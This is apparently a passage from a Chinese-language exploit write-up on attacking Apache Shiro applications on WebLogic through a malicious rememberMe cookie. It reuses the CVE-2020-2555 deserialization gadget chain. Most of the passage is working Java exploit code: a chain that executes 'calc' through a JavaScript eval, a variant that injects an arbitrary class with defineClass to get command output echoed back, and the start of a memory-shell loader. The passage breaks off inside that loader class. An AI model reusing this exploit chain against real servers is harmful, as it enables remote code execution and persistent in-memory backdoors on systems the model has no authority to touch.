            ReflectionExtractor extractor2 = new ReflectionExtractor(
                    "newInstance",
                    new Object[]{new Object[0]}
            );
            ReflectionExtractor extractor3 = new ReflectionExtractor(
                    "getEngineByName",
                    new Object[]{"javascript"}
            );
            ReflectionExtractor extractor4 = new ReflectionExtractor(
                    "eval",
                    new Object[]{"java.lang.Runtime.getRuntime().exec('calc');"}
            );
            ReflectionExtractor[] extractors = {
                    extractor1,
                    extractor2,
                    extractor3,
                    extractor4
            };
            ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
            LimitFilter limitFilter = new LimitFilter();
            //m_comparator
            Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(limitFilter, chainedExtractor);
            //m_oAnchorTop
            Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
            m_oAnchorTop.setAccessible(true);
            m_oAnchorTop.set(limitFilter, ScriptEngineManager.class);
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException, limitFilter);
            //序列化
            byte[] bytes = Util.serialize(badAttributeValueExpException);
            //反序列化
            Util.deserialize(bytes);
这次，在使用此代码生成 `rememberMe cookie` 攻击本地部署的 Shiro 应用时，终于成功弹出了计算器，清水NB  
## 下一步，成功的回显
在成功利用 `ScriptEngineManager` 执行任意代码后，下一步的目标就是实现回显了。回显代码 `Lufei`
师傅很早的时候就给出来了，但是这里要把它改成 `js` 的方式还是有些麻烦的，不过还好这块我有经验，之前在写
[JNDIExploit](https://github.com/feihong-cs/JNDIExploit) 的时候，在编写 `Tomcat-EL
Bypass`的时候就需要将大量的 Java代码转换为 JS代码，这个非常让人头痛，不过最后终于用类加载的方式解决了这个让人头痛的问题。于是可以将
`CVE-2020-2555` 修改为如下方式，结合之前 `Lufei` 师傅的 Weblogic 回显代码，最终得到的代码如下
    byte[] bytes = ClassFiles.classAsBytes(WeblogicEcho.class);
            String classCode = Base64.encodeToString(bytes);
            String code = "var bytes = org.apache.shiro.codec.Base64.decode('" + classCode + "');\n" +
                    "        var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                    "        try{\n" +
                    "            var clazz = classLoader.loadClass('" + cls.getName() + "');\n" +
                    "            clazz.newInstance();\n" +
                    "        }catch(err){\n" +
                    "            var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                    "            method.setAccessible(true);\n" +
                    "            var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                    "            clazz.newInstance();\n" +
                    "        }";
            ReflectionExtractor extractor1 = new ReflectionExtractor(
                    "getConstructor",
                    new Object[]{new Class[0]}
            );
            ReflectionExtractor extractor2 = new ReflectionExtractor(
                    "newInstance",
                    new Object[]{new Object[0]}
            );
            ReflectionExtractor extractor3 = new ReflectionExtractor(
                    "getEngineByName",
                    new Object[]{"javascript"}
            );
            ReflectionExtractor extractor4 = new ReflectionExtractor(
                    "eval",
                    new Object[]{code}
            );
            ReflectionExtractor[] extractors = {
                    extractor1,
                    extractor2,
                    extractor3,
                    extractor4
            };
            ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
            LimitFilter limitFilter = new LimitFilter();
            //m_comparator
            Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(limitFilter, chainedExtractor);
            //m_oAnchorTop
            Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
            m_oAnchorTop.setAccessible(true);
            m_oAnchorTop.set(limitFilter, ScriptEngineManager.class);
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException, limitFilter);
            return Util.serialize(badAttributeValueExpException);
使用此代码生成的`rememberMe cookie`，最终成功实现了回显  
## 最后一步，实现内存shell
内存shell的话，之前有师傅已经写过文章了，由于 cookie 大小的限制，实际的内存shell 代码是放在 `POST Body`里面的，用
cookie 里的代码加载执行 `POST Body` 中的代码并执行从而得到内存shell。这里的内存shell，直接使用我在 `JNDIExploit`
中使用的代码，其中 cookie 中的 loader 代码如下
    package com.feihong.template;
    import org.apache.shiro.codec.Base64;
    import weblogic.servlet.internal.ServletRequestImpl;
    import weblogic.work.ExecuteThread;
    import weblogic.work.WorkAdapter;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    public class WeblogicMemshellLoader {